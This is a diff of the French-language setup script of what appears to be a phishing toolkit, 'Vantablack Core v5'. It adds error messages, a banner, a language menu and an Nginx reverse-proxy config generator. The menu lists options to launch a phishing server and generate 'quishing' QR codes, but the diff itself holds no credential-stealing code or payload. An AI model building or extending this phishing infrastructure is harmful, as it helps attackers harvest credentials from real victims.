@@ -50,7 +50,8 @@ class SetupSystem:
                         return "arch"
                     elif 'fedora' in content or 'redhat' in content:
                         return "fedora"
-            except:
+            except Exception as e:
+                print(f"{Colors.YELLOW}⚠️ Erreur détection OS: {e}{Colors.RESET}")
                 pass
             return "linux"
         return "unknown"
@@ -82,6 +83,43 @@ class SetupSystem:
         }
         return requirements
     
+    def display_banner(self):
+        """Affiche la bannière personnalisée"""
+        print(f"{Colors.BOLD}{Colors.MAGENTA}")
+        print("  █████╗ ██╗     ███████╗██╗  ██╗ ")
+        print(" ██╔══██╗██║     ██╔════╝╚██╗██╔╝ ")
+        print(" ███████║██║     █████╗   ╚███╔╝  ")
+        print(" ██╔══██║██║     ██╔══╝   ██╔██╗  ")
+        print(" ██║  ██║███████╗███████╗██╔╝ ██╗ ")
+        print(" ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝ ")
+        print("")
+        print("        V A N T A B L A C K")
+        print("     THESENEGALESEHITCH")
+        print("")
+        print("═══════════════════════════════════════════")
+        print(f"{Colors.RESET}")
+
+    def change_language(self):
+        """Change la langue de l'interface"""
+        print(f"{Colors.BOLD}🌐 Changement de langue{Colors.RESET}")
+        print(f"{Colors.GREEN}1.{Colors.RESET} Français")
+        print(f"{Colors.GREEN}2.{Colors.RESET} English")
+        
+        choice = input(f"{Colors.YELLOW}➤ Choisissez une langue (1-2): {Colors.RESET}").strip()
+        
+        if choice == "1":
+            # Français
+            from core.utils.i18n import i18n
+            i18n.set_language("fr")
+            print(f"{Colors.GREEN}✅ Langue changée: Français{Colors.RESET}")
+        elif choice == "2":
+            # English
+            from core.utils.i18n import i18n
+            i18n.set_language("en")
+            print(f"{Colors.GREEN}✅ Language changed: English{Colors.RESET}")
+        else:
+            print(f"{Colors.RED}❌ Option invalide{Colors.RESET}")
+
     def check_command(self, cmd: str) -> bool:
         """Vérifie si une commande est disponible"""
         return shutil.which(cmd) is not None
@@ -174,9 +212,10 @@ class SetupSystem:
             print(f"{Colors.GREEN}7.{Colors.RESET} Lancer le serveur phishing")
             print(f"{Colors.GREEN}8.{Colors.RESET} Générer QR Code (Quishing)")
             print(f"{Colors.GREEN}9.{Colors.RESET} Configuration avancée")
+            print(f"{Colors.GREEN}10.{Colors.RESET} Changer la langue (Français/English)")
             print(f"{Colors.GREEN}0.{Colors.RESET} Quitter")
             
-            choice = input(f"\n{Colors.YELLOW}➤ Choisissez une option (0-9): {Colors.RESET}").strip()
+            choice = input(f"\n{Colors.YELLOW}➤ Choisissez une option (0-10): {Colors.RESET}").strip()
             
             if choice == "1":
                 self.full_install()
@@ -196,6 +235,8 @@ class SetupSystem:
                 self.generate_qr_code()
             elif choice == "9":
                 self.advanced_config()
+            elif choice == "10":
+                self.change_language()
             elif choice == "0":
                 print(f"{Colors.GREEN}👋 Au revoir!{Colors.RESET}")
                 break
@@ -317,7 +358,8 @@ class SetupSystem:
             try:
                 logo_index = int(logo_choice)
                 selected_logo = logos[logo_index]
-            except:
+            except Exception as e:
+                print(f"{Colors.YELLOW}⚠️ Erreur sélection logo: {e}{Colors.RESET}")
                 selected_logo = None
         else:
             selected_logo = None
@@ -383,6 +425,42 @@ credentials-file: .cloudflared/cert.pem
         
         print(f"{Colors.YELLOW}Utilisez: python phishing_server.py --target <nom_phishlet>{Colors.RESET}")
     
+    def setup_reverse_proxy(self):
+        """Configure le reverse proxy Nginx"""
+        print(f"{Colors.BLUE}🌐 Configuration du reverse proxy...{Colors.RESET}")
+        
+        if not self.check_command("nginx"):
+            print(f"{Colors.RED}❌ Nginx n'est pas installé{Colors.RESET}")
+            print(f"{Colors.YELLOW}Installez-le avec: sudo apt install nginx (Ubuntu) ou brew install nginx (macOS){Colors.RESET}")
+            return
+        
+        # Configuration Nginx pour reverse proxy
+        nginx_config = """server {
+    listen 80;
+    server_name localhost;
+    
+    location / {
+        proxy_pass http://localhost:8080;
+        proxy_set_header Host $host;
+        proxy_set_header X-Real-IP $remote_addr;
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+        proxy_set_header X-Forwarded-Proto $scheme;
+    }
+}
+"""
+        
+        config_path = "/tmp/vantablack_nginx.conf"
+        try:
+            with open(config_path, 'w') as f:
+                f.write(nginx_config)
+            
+            print(f"{Colors.GREEN}✅ Configuration Nginx créée: {config_path}{Colors.RESET}")
+            print(f"{Colors.YELLOW}Pour tester: sudo nginx -t -c {config_path}{Colors.RESET}")
+            print(f"{Colors.YELLOW}Pour utiliser: sudo nginx -c {config_path}{Colors.RESET}")
+            
+        except PermissionError:
+            print(f"{Colors.RED}❌ Permission denied. Essayez avec sudo.{Colors.RESET}")
+    
     def run_security_tests(self):
         """Exécute les tests de sécurité"""
         python_cmd = self.get_venv_python()
@@ -404,14 +482,8 @@ credentials-file: .cloudflared/cert.pem
 
 def main():
     """Point d'entrée principal"""
-    print(f"{Colors.BOLD}{Colors.MAGENTA}"""
-    ██╗   ██╗ █████╗ ███╗   ██╗████████╗ █████╗ ██████╗ ██╗      █████╗  ██████╗██╗  ██╗
-    ██║   ██║██╔══██╗████╗  ██║╚══██╔══╝██╔══██╗██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝
-    ██║   ██║███████║██╔██╗ ██║   ██║   ███████║██████╔╝██║     ███████║██║     █████╔╝ 
-    ╚██╗ ██╔╝██╔══██║██║╚██╗██║   ██║   ██╔══██║██╔══██╗██║     ██╔══██║██║     ██╔═██╗ 
-     ╚████╔╝ ██║  ██║██║ ╚████║   ██║   ██║  ██║██████╔╝███████╗██║  ██║╚██████╗██║  ██╗
-      ╚═══╝  ╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝   ╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
-    """ + Colors.RESET)
+    print(f"{Colors.BOLD}{Colors.MAGENTA}VANTABLACK CORE v5 - SETUP SYSTEM{Colors.RESET}")
+    print(f"{Colors.BOLD}══════════════════════════════════════════════════════{Colors.RESET}")
     
     print(f"{Colors.BOLD}Vantablack Core v5 - Setup System{Colors.RESET}")
     print(f"{Colors.YELLOW}Système de configuration automatique et interactif{Colors.RESET}")
